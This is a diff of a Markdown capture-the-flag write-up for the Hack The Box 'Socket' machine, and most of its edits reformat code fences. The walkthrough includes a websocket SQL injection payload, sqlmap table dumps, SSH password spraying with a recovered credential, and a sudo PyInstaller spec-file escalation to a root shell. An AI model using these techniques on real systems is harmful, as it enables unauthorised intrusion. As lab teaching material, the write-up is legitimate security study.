@@ -13,8 +13,8 @@ Socket is a Medium Difficulty Linux machine that requires reversing a Linux/Wind
 
 I start my enumeration with `nmap` and scan all ports on the target machine.
 
-```xml
-$ nmap -p- --min-rate 10000 $IP -o 1_nmap_open_ports
+```ansi
+$ nmap -p- --min-rate 10000 10.10.11.206
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 12:06 CEST
 Nmap scan report for 10.10.11.206
 Host is up (0.025s latency).
@@ -29,7 +29,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
 
 It shows three open TCP ports, `SSH` (22), `HTTP` (80) and an unknown service on 5789:
 
-```xml
+```ansi
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 12:07 CEST
 Nmap scan report for 10.10.11.206
 Host is up (0.031s latency).
@@ -117,7 +117,7 @@ This website allows me to embed a message in a QR code, which I can download and
 
 ```bash
 ┌──(nickvd㉿kali)-[~/Boxes/Socket]
-└─$ gobuster dir -u http://qreader.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster_scan.txt                                                                                                  130 ⨯
+└─$ gobuster dir -u http://qreader.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster_scan.txt
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -199,7 +199,7 @@ The implementation is interesting as the connection gets closed after sending a 
 
 Unzipping the Linux package creates an `app` directory and a `test.png` file:
 
-```xml
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/binz]
 └─$ unzip QReader_lin_v0.0.2.zip
 Archive:  QReader_lin_v0.0.2.zip
@@ -222,7 +222,7 @@ The test image is a QR code which decodes to `kavigihan`, who is the author of t
 
 Running strings on the `qreader` binary returns a lot of strings. So decide to run the binary through `readelf`:
 
-```xml
+```ansi
 ┌──(ncikvd㉿kali)-[~/Boxes/Socket/binz]
 └─$ readelf -e app/qreader
 ELF Header:
@@ -360,7 +360,7 @@ One thing that caught my eye is the `pydata` section, which I’m not used to se
 
 To confirm, I once more run strings against the binary:
 
-```bash
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/binz/app]
 └─$ strings qreader | grep -i pyinstaller
 Cannot open PyInstaller archive from executable (%s) or external archive (%s)
@@ -376,7 +376,7 @@ It offers similar functionality as the application and allows users to read and 
 
 That’s when I decided to use `pyinstrxtractor` to unpack the binary and try to extract the Python source code. First, I use `objcopy` to dump the `pydata` section into a separate file on disk.
 
-```xml
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/binz/app]
 └─$ objcopy --dump-section pydata=pydata.dump qreader
 
@@ -392,8 +392,8 @@ drwxr-xr-x 3 nickvd nickvd 4.0K Jul 15 10:22 ..
 
 From here, I use `pyinstrxtractor` to extract the original `pyc` files from the dump.
 
-```xml
-┌──(vagrant㉿kali)-[~/Boxes2/Socket/binz/app]
+```ansi
+┌──(nickvd㉿kali)-[~/Boxes2/Socket/binz/app]
 └─$ python3 /opt/pyinstxtractor/pyinstxtractor.py pydata.dump
 [+] Processing pydata.dump
 [+] Pyinstaller version: 2.1+
@@ -423,9 +423,9 @@ You can now use a python decompiler on the pyc files within the extracted direct
 
 I need a decent Python decompiler to transform the `pyc` code back into readable Python code. The `pyinstratxractor` wiki seems to recommend [uncompyle6](https://github.com/rocky/python-uncompyle6/#installation), but this is where things started to take a turn for the worse. `uncompyle6` is picky about the Python versions it supports. By default, I always have the latest Python installed on my machine. But to run `uncompyle6` I need to grab an older version first. In this case, I install Python 3.9 with pyenv:
 
-```xml
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/binz/app]
-└─$ pyenv install 3.9.0                                                                                                                                                                                                                  1 ⨯
+└─$ pyenv install 3.9.0
 Downloading Python-3.9.0.tar.xz...
 -> https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tar.xz
 Installing Python-3.9.0...
@@ -440,7 +440,7 @@ Installed Python-3.9.0 to /home/vagrant/.local/share/pyenv/versions/3.9.0
 
 With the correct Python version in place, I can now follow the [README.md](http://README.md) of the `uncompyle6` repo to install the package
 
-```xml
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/binz/app]
 └─$ pip3 install uncompyle6
 Collecting uncompyle6
@@ -461,7 +461,7 @@ You should consider upgrading via the '/home/nickvd/.local/share/pyenv/versions/
 
 Quite a few files were extracted from the package, but the one that immediately caught my eye was the `qreader.pyc` file. I assume that this will contain the main application code. So I decided to run `uncompyle` against it.
 
-```xml
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes2/Socket/binz/app]
 └─$ uncompyle6 ./pydata.dump_extracted/qreader.pyc ./qreader.py
 # uncompyle6 version 3.9.0
@@ -480,7 +480,7 @@ File './qreader.py' doesn't exist. Skipped
 
 But it failed; it turns out that the version uncompyle runs should match the pyc bytecode version. And this is where the mismatch occurs, and it turns out that `uncompyle` doesn’t work yet with any Python version above 3.9. Luckily for me, the `pyinstxtractor` has another recommendation [Decompyle++](https://github.com/zrax/pycdc) or `pycdc` as it seems to be renamed. But there’s a bit more involved to get it going:
 
-```xml
+```ansi
 ┌──(nickvd㉿kali)-[~/Sources]
 └─$ git clone https://github.com/zrax/pycdc.git
 Cloning into 'pycdc'...
@@ -527,7 +527,7 @@ Resolving deltas: 100% (1582/1582), done.
 [100%] Built target pycdc
 
 ┌──(nickvd㉿kali)-[~/Sources/pycdc/build]
-└─$ sudo make install                                                                                                                                                                                                                  127 ⨯
+└─$ sudo make install
 [ 85%] Built target pycxx
 [ 90%] Built target pycdas
 [100%] Built target pycdc
@@ -539,12 +539,7 @@ Install the project...
 
 This adds the `pycdc` binary to my path, and I can take another attempt ad decompiling the Python bytecode:
 
-```bash
-┌──(nickvd㉿kali)-[~/Boxes2/Socket/binz/app]
-└─$ pycdc ./pydata.dump_extracted/qreader.pyc
-# Source Generated with Decompyle++
-# File: qreader.pyc (Python 3.10)
-
+```python title="decompiled_qreader.pyc"
 import cv2
 import sys
 import qrcode
@@ -680,7 +675,7 @@ if __name__ == '__main__':
 
 The endpoint that the application is using for its websocket connection is `ws.qreader.htb:5789`, this explains the error messages from earlier. Adding this to my hosts file resolves these errors, and I can send messages to the `/version` and `/updates` endpoint via the app. From reading the source code, I can now see how the `version` endpoint works:
 
-```bash
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket]
 └─$ wscat --connect qreader.htb:5789/version
 Connected (press CTRL+C to quit)
@@ -696,7 +691,7 @@ Connected (press CTRL+C to quit)
 Disconnected (code: 1000, reason: "")
 ```
 
-### Hindsight is 20/20
+### Hindsight 20/20
 
 After completing the machine, I learned that I took the more difficult route to find the vulnerable endpoint. The part of decompiling the binary to extract the Python source code was a bit of a rabbit hole. As it turns out, executing the binary with `Wireshark` on made it much easier to learn what was happening over the wire.
 
@@ -759,9 +754,9 @@ term.cmdloop()
 
 Saving the script as `ws_cmd.py` and installing the websockets library with `pip install websockets` I now I have a more resilient CLI client:
 
-```bash
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/scripts]
-└─$ python ws_cmd.py                                                                                                                                                                          130 ⨯
+└─$ python ws_cmd.py
 > 1
 < {"message": "Invalid version!"}
 > hello
@@ -775,7 +770,7 @@ received 1011 (unexpected error); then sent 1011 (unexpected error)
 
 When I send a double quote I notice that the server crashes, which could indicate that I ended up creating an invalid SQL query. To confirm I try a SQL injection payload:
 
-```bash
+```ansi
 > hello" or "" = "
 < {"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
 ```
@@ -851,7 +846,7 @@ except KeyboardInterrupt:
 
 And now, I can start the proxy server with:
 
-```bash
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/scripts]
 └─$ python ws.py                                                                                                                                                                                                                 1 ⨯
 [+] Starting MiddleWare Server
@@ -860,7 +855,7 @@ And now, I can start the proxy server with:
 
 After that, I can point `sqlmap` to my local endpoint and let it reveal any SQLi vulnerabilities:
 
-```bash
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket]
 └─$ sqlmap -u 'http://localhost:8081?version=1' --batch --dbs --level 5 --risk 3
         ___
@@ -936,7 +931,7 @@ back-end DBMS: SQLite
 
 I can now dump each table on its own and go slowly. Or because its a HTB challenge and the tables won't contain much, I can immediately dump all tables at once.:
 
-```bash
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket]
 └─$ sqlmap -u 'http://localhost:8081?version=1' --batch --tables --level 5 --risk 3 --dump
         ___
@@ -1039,7 +1034,7 @@ Digging through the other user I find that `Thomas Keller` wrote a message in th
 
 My assumption is that `Thomas Keller` is the admin for the website and most likely has reused the same password for `ssh`. But I need a list of usernames; for this I use [username-anarchy](https://github.com/urbanadventurer/username-anarchy):
 
-```bash
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/scripts]
 └─$ ./username-anarchy.rb thomas keller
 thomas
@@ -1061,9 +1056,9 @@ tk
 
 To quickly test these, I dump them in a file named `users.txt` and run them through `crackmapexec`:
 
-```bash
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/scripts]
-└─$ crackmapexec ssh 10.10.11.206 -u users.txt -p denjanjade122566                                                                                                                                                             130 ⨯
+└─$ crackmapexec ssh 10.10.11.206 -u users.txt -p denjanjade122566
 SSH         10.10.11.206    22     10.10.11.206     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
 SSH         10.10.11.206    22     10.10.11.206     [-] thomas:denjanjade122566 Authentication failed.
 SSH         10.10.11.206    22     10.10.11.206     [-] thomaskeller:denjanjade122566 Authentication failed.
@@ -1079,7 +1074,7 @@ SSH         10.10.11.206    22     10.10.11.206     [+] tkeller:denjanjade122566
 
 Now I can log in to the server and grab the `user.txt` file.
 
-```bash
+```ansi
 ┌──(nickvd㉿kali)-[~/Boxes/Socket/scripts]
 └─$ ssh tkeller@10.10.11.206
 The authenticity of host '10.10.11.206 (10.10.11.206)' can't be established.
@@ -1100,7 +1095,7 @@ e05ce0609c8615871b81922dc507ae81
 
 The first thing I check is `sudo -l`, which shows that I can run a script as root:
 
-```xml
+```ansi
 tkeller@socket:~$ sudo -l
 Matching Defaults entries for tkeller on socket:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -1111,7 +1106,7 @@ User tkeller may run the following commands on socket:
 
 With `cat` I can dump the contents of the script to my terminal:
 
-```bash
+```bash title="/usr/local/sbin/build-installer.sh"
 #!/bin/bash
 if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
   /usr/bin/echo "No enough arguments supplied"
@@ -1176,7 +1171,7 @@ coll = COLLECT(...)
 
 Given this is all plain Python code. I wonder if I can create a minimal spec file that executes `/bin/bash`:
 
-```python
+```ansi
 tkeller@socket:~$ cd /tmp
 tkeller@socket:/tmp$ echo 'import os;os.system("/bin/bash")'  > my.spec
 tkeller@socket:/tmp$ sudo /usr/local/sbin/build-installer.sh build my.spec
@@ -1193,7 +1188,7 @@ And it worked. When PyInstaller executed the spec, my malicious spec file spawne
 
 Now I can read `root.txt`:
 
-```python
+```ansi
 root@socket:/tmp# cd /root
 
 root@socket:~# cat root.txt
